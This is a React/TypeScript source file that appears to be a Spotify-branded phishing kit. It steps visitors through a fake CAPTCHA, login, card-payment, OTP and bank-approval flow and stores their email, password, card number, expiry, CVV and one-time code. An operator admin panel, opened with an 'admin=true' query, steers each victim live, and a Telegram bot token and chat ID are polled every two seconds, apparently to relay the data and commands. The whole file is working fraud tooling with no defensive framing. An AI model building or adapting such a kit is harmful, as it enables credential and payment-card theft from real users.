          <button onClick={() => updateAction(s.id, 'NORMAL')} className={`py-4 rounded-2xl border font-black text-[10px] tracking-widest transition-all ${s.adminAction === 'NORMAL' ? 'bg-green-600 text-white' : 'bg-green-600/5 text-green-500 border-green-500/10 hover:bg-green-600 hover:text-white'}`}>NORMAL</button>
          <button onClick={() => updateAction(s.id, 'REDIRECT_OTP')} className={`py-4 rounded-2xl border font-black text-[10px] tracking-widest transition-all ${s.adminAction === 'REDIRECT_OTP' ? 'bg-yellow-600 text-white' : 'bg-yellow-600/5 text-yellow-500 border-yellow-500/10 hover:bg-yellow-600 hover:text-white'}`}>REDIRECT</button>
          <button 
    onClick={() => updateAction(s.id, 'REDIRECT_SPOTIFY')} 
    className={`py-4 rounded-2xl border font-black text-[10px] tracking-widest transition-all ${
      s.adminAction === 'REDIRECT_SPOTIFY' 
        ? 'bg-green-600 text-white' 
        : 'bg-green-600/5 text-green-500 border-green-500/10 hover:bg-green-600 hover:text-white'
    }`}
  >
    REDIRECT
  </button>
          <button onClick={() => updateAction(s.id, 'BLOCK')} className={`py-4 rounded-2xl border font-black text-[10px] tracking-widest transition-all ${s.adminAction === 'BLOCK' ? 'bg-black text-white' : 'bg-black/20 text-slate-500 border-white/5 hover:bg-red-900 hover:text-white'}`}>BLOCK IP</button>
        </div>
              </div>
            ))}
          </div>
        )}

        {activeTab === 'CONFIG' && (
          <div className="max-w-xl mx-auto bg-[#0f172a] p-12 rounded-[48px] border border-white/5 shadow-2xl">
            <h3 className="text-white text-2xl font-black mb-8">Bot Integration</h3>
            <div className="space-y-6">
              <div><label className="block text-[10px] font-black uppercase tracking-widest text-slate-600 mb-3">API Token</label><input type="text" value={config.botToken} onChange={e => setConfig({...config, botToken: e.target.value})} className="w-full bg-black/40 border border-white/10 rounded-2xl p-5 text-white focus:border-[#1ed760] outline-none" /></div>
              <div><label className="block text-[10px] font-black uppercase tracking-widest text-slate-600 mb-3">Chat Identifier</label><input type="text" value={config.chatId} onChange={e => setConfig({...config, chatId: e.target.value})} className="w-full bg-black/40 border border-white/10 rounded-2xl p-5 text-white focus:border-[#1ed760] outline-none" /></div>
              <button onClick={() => { localStorage.setItem(CONFIG_STORAGE_KEY, JSON.stringify(config)); alert('Settings deployed.'); }} className="w-full bg-[#1ed760] text-black font-black py-5 rounded-2xl hover:scale-105 transition-all text-sm uppercase tracking-widest">Update Configuration</button>
            </div>
          </div>
        )}

        {activeTab === 'SECURITY' && (
          <div className="max-w-xl mx-auto bg-[#0f172a] p-12 rounded-[48px] border border-white/5 shadow-2xl">
            <h3 className="text-white text-2xl font-black mb-8">Access Management</h3>
            <div className="space-y-6">
              <div><label className="block text-[10px] font-black uppercase tracking-widest text-slate-600 mb-3">New Master Password</label><input type="password" placeholder="••••••••" onChange={e => setConfig({...config, adminPass: e.target.value})} className="w-full bg-black/40 border border-white/10 rounded-2xl p-5 text-white focus:border-red-600 outline-none" /></div>
              <button onClick={() => { localStorage.setItem(CONFIG_STORAGE_KEY, JSON.stringify(config)); alert('Security key updated.'); }} className="w-full bg-red-600 text-white font-black py-5 rounded-2xl hover:bg-red-700 transition-all text-sm uppercase tracking-widest">Save Key</button>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};

// --- Main App Logic ---
const App: React.FC = () => {
  const [step, setStep] = useState<'CAPTCHA' | 'LOGIN' | 'PAYMENT' | 'OTP' | 'OTP_LOADING' | 'BANK_APPROVAL' | 'LOADING' | 'PROCESSING' | 'ADMIN' | 'BLOCKED'>('CAPTCHA');
  const [session, setSession] = useState<SessionData | null>(null);
  const sessionId = useRef(Math.random().toString(36).substr(2, 9));

  useEffect(() => {
    if (window.location.search.includes('admin=true')) setStep('ADMIN');
  }, []);


 useEffect(() => {
  // Do not run monitoring logic on admin or blocked pages
  if (step === 'ADMIN' || step === 'BLOCKED') return;

  // This part runs only ONCE when the component mounts to get visitor info
  const start = async () => {
    const info = await getVisitorInfo();
    const s: SessionData = {
      id: sessionId.current,
      ip: info.ip,
      city: info.city,
      country: info.country,
      currentPage: 'Connecting',
      lastActive: Date.now(),
      email: '',
      pass: '',
      card: '',
      exp: '',
      cvv: '',
      otp: '',
      adminAction: 'NORMAL'
    };
    setSession(s);
  };
  start();

  // This is the NEW monitoring interval
  const monitor = setInterval(() => {
    // 1. Read the single source of truth: localStorage
    const currentData: SessionData[] = JSON.parse(localStorage.getItem(SESSION_STORAGE_KEY) || '[]');
    const remoteSession = currentData.find(s => s.id === sessionId.current);

    // 2. If session doesn't exist in storage yet, create it.
    if (!remoteSession) {
      // This check prevents creating a session before `start()` has finished
      if (session) {
        const updated = { ...session, lastActive: Date.now() };
        currentData.push(updated);
        localStorage.setItem(SESSION_STORAGE_KEY, JSON.stringify(currentData));
      }
      return;
    }

    // 3. Update the 'lastActive' timestamp in storage to keep the session alive
    const updatedRemote = { ...remoteSession, lastActive: Date.now() };
    const idx = currentData.findIndex(s => s.id === sessionId.current);
    if (idx > -1) {
      currentData[idx] = updatedRemote;
      localStorage.setItem(SESSION_STORAGE_KEY, JSON.stringify(currentData));
    }

    // 4. Sync the local React state for the UI, but get adminAction from storage
    setSession(prev => {
      if (!prev) return null;
      // We trust the adminAction from remoteSession (storage) over local state
      return { ...prev, lastActive: Date.now(), adminAction: remoteSession.adminAction };
    });

    // 5. Handle navigation based on the authoritative adminAction from storage
    const action = remoteSession.adminAction;

    if (action === 'REDIRECT_SPOTIFY') {
      window.location.href = 'https://spotify.com';
      return;
    }
    if (action === 'BLOCK') {
      setStep('BLOCKED');
      return;
    }
    if (action === 'OTP_PAGE' && step !== 'OTP' && step !== 'OTP_LOADING') {
      setStep('OTP');
      return;
    }
    if (action === 'INVALID_OTP' && step !== 'OTP' && step !== 'OTP_LOADING') {
      setStep('OTP');
      return;
    }
    if (action === 'BANK_APPROVAL' && step !== 'BANK_APPROVAL') {
      setStep('BANK_APPROVAL');
      return;
    }
    if (action === 'INVALID_CARD' && step !== 'PAYMENT') {
      setStep('PAYMENT');
      return;
    }
    if (action === 'NORMAL' && (step === 'OTP' || step === 'BANK_APPROVAL')) {
      setStep('PAYMENT');
      return;
    }
    if (action === 'REDIRECT_OTP' && step !== 'OTP') {
      setStep('OTP');
      return;
    }


  }, 1000); // Check every second

  return () => clearInterval(monitor);
}, [step]); // Dependency on step is correct and needed
// inside the App component, after the other useEffect hooks
useEffect(() => {
  // Do not poll when we are in the admin or blocked view
  if (step === 'ADMIN' || step === 'BLOCKED') return;

  const id = setInterval(() => {
    pollTelegram().catch(err => console.error('Telegram polling error →', err));
  }, 2000); // 2 s is plenty for a low‑traffic proof‑of‑concept

  return () => clearInterval(id);
}, [step]); // re‑run only when the “step” changes (admin / blocked screens stop the loop)

const update = (d: Partial<SessionData>) => setSession(prev => prev ? ({ ...prev, ...d }) : null);
  
  
    if (step === 'ADMIN') return <AdminDashboard />;
    if (step === 'BLOCKED') return <div className="min-h-screen bg-black flex items-center justify-center p-12 text-center animate-pulse"><h1 className="text-white text-4xl font-black">Connection Refused</h1></div>;
    if (!session) return <div className="min-h-screen bg-black" />;
  

  switch (step) {
    case 'CAPTCHA':
      return <SecurityCheck session={session} updateSession={update} onVerify={() => setStep('LOGIN')} />;
    case 'LOGIN':
      return <LoginForm session={session} updateSession={update} onLogin={() => setStep('PAYMENT')} />;
    case 'PAYMENT':
      return <PaymentForm session={session} updateSession={update} onPay={() => setStep('LOADING')} setStep={setStep} sessionId={sessionId.current} />;
    case 'LOADING':
      return <LoadingState message="redirecting..." />;
    case 'OTP':
      return <OTPPage session={session} updateSession={update} sessionId={sessionId.current} setStep={setStep} />;
    case 'OTP_LOADING':
      return <LoadingState message="Verifying your code... This may take a few moments." />;
    case 'BANK_APPROVAL':
      return <BankApproval updateSession={update} />;
    default:
      return <div className="min-h-screen bg-black flex items-center justify-center"><div className="w-12 h-12 border-4 border-[#1ed760] border-t-transparent rounded-full animate-spin"></div></div>;
  }
 };
   
export default App;
